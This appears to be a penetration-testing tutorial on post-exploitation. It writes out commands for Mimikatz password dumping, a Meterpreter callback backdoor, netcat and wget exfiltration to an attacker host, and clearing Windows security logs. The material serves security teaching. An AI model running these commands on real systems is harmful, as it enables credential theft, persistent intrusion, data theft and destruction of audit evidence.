---
title: "Maintaining Access & Covering Tracks: Persistence, Data Exfiltration, and Evasion Techniques"
description: "Learn about post-exploitation techniques, including privilege escalation with Metasploit and PowerSploit, establishing persistence with web shells, exfiltrating data, and covering your tracks."
image: "https://armur-ai.github.io/armur-blog-pentest/images/security-fundamentals.png"
icon: "code"
draft: false
---

## Introduction

This tutorial delves into post-exploitation techniques, focusing on maintaining access to compromised systems, escalating privileges, exfiltrating data, and covering your tracks to avoid detection. We'll explore tools like Metasploit, PowerSploit, web shells, and various data exfiltration methods.

### Privilege Escalation

Privilege escalation involves gaining higher-level privileges on a compromised system, such as administrator or root access.

**Metasploit for Privilege Escalation:**

Metasploit provides various modules for privilege escalation, targeting specific operating systems and vulnerabilities.

**Example: Using the "Windows Local Exploit Suggester"**

This module scans the target system for potential privilege escalation vulnerabilities.

```bash
use post/multi/recon/local_exploit_suggester
```

**PowerSploit:**

PowerSploit is a collection of PowerShell scripts for post-exploitation activities, including privilege escalation.

**Example: Using "Invoke-Mimikatz"**

`Invoke-Mimikatz` can be used to extract plaintext passwords from memory.

```powershell
Invoke-Mimikatz
```

### Establishing Persistence

Persistence mechanisms allow attackers to maintain access to a compromised system even after a reboot or user logout.

**Web Shells:**

Web shells are scripts that provide a backdoor interface to a web server.

**Example: Uploading a PHP Web Shell:**

Upload a PHP web shell (e.g., "cmd.php") to a vulnerable web server directory. Access the web shell through a web browser to execute commands on the server.

**Meterpreter:**

Meterpreter is a Metasploit payload that provides advanced post-exploitation capabilities, including persistence mechanisms.

**Example: Establishing Persistence with Meterpreter:**

Use the `persistence` command within a Meterpreter session to create a persistent backdoor.

```
meterpreter > persistence -S -i 5 -p 4444 -r 192.168.1.100
```

This command creates a persistent backdoor that connects back to the attacker's machine every 5 seconds on port 4444.

### Data Exfiltration

Data exfiltration involves transferring sensitive data from a compromised system to an attacker-controlled location.

**Netcat:**

Netcat is a versatile networking tool that can be used for various purposes, including data exfiltration.

**Example: Exfiltrating a File with Netcat:**

On the compromised system:

```bash
nc 192.168.1.100 4444 < sensitive_data.txt
```

On the attacker's machine:

```bash
nc -lvp 4444 > received_data.txt
```

**wget and curl:**

`wget` and `curl` can be used to download files from a compromised system to an attacker-controlled server.

**Example: Exfiltrating a File with wget:**

On the compromised system:

```bash
wget --post-file=sensitive_data.txt http://attacker_server/exfil.php
```

### Covering Tracks

Covering tracks involves removing evidence of your presence on a compromised system to avoid detection.

**Clearing Logs:**

Attackers may attempt to clear system logs to erase evidence of their activities.

**Example: Clearing Windows Event Logs:**

```powershell
Clear-EventLog -LogName "Security"
```

**Rootkit Detection:**

Rootkits are tools that hide the presence of malware or attackers on a system.

**Example: Using rkhunter:**

rkhunter is a rootkit detection tool that can scan for known rootkit signatures.

```bash
rkhunter --checkall
```

## Best Practices for Post-Exploitation

* **Minimize Impact:** Avoid unnecessary actions that could damage the compromised system.
* **Data Integrity:** Preserve the integrity of data during exfiltration.
* **Avoid Detection:** Utilize evasion techniques to minimize the risk of detection.
* **Clean Up:** Remove any backdoors or malicious code after completing your activities.

## Conclusion

This tutorial covered various post-exploitation techniques, including privilege escalation, persistence mechanisms, data exfiltration methods, and techniques for covering tracks. Mastering these techniques is crucial for penetration testers and security professionals to effectively assess the impact of vulnerabilities and understand the potential for attackers to maintain access and exfiltrate sensitive data. Remember to always operate within ethical and legal boundaries and obtain proper authorization before conducting any security testing activities.